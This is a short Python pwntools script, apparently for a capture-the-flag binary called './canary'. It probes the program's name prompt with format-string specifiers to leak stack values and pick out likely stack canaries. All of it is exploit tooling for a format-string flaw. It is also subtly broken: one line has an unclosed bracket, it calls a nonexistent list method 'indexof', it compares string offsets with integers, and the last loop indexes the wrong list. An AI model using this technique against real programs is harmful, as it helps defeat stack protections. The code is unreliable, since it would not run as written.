from pwn import *

offsets = []
possible = []
different = []

amount = input("Scan for: ")

for x in range(int(amount)):
	p = ELF("./canary").process()
	p.recvuntil("name? ")
	p.sendline("%" + str(x) + "$lx")
	value = p.readline().split()[-1].replace("!", "")
	if value.endswith("00"):
		offsets.append(str(x))
		possible.append(value)

print("#### Possible ####")
for x in range(len(offsets)):
	print(offsets[x] + ": " + possible[x])

for x in range(int(amount)):
	p = ELF("./canary").process()
	p.recvuntil("name? ")
	p.sendline("%" + str(x) + "$lx")
	value = p.readline().split()[-1].replace("!", "")
	if x in offsets:
		if possible[offsets.indexof(x) != value:
			different.append(x)

print("#### Different ####")
for x in range(len(different)):
	print(offsets[x] + ": " + possible[offsets.indexof(x)])